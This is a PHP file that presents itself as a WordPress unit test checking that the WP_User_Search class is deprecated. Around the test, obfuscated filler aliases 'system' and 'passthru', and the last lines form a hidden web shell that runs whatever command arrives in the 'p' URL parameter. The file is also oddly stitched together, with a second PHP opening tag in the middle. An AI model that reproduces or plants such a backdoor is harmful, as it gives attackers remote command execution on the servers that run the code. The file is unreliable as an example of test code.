<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * @group admin
 * @group user
 *
 * @coversDefaultClass WP_User_Search
 */
class Tests_Admin_wpUserSearch extends WP_UnitTestCase {

	/**
	 * @covers ::__construct()
	 * @expectedDeprecated WP_User_Search
	 */
	public function test_class_is_deprecated() {
		$wp_user_search = new WP_User_Search();
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>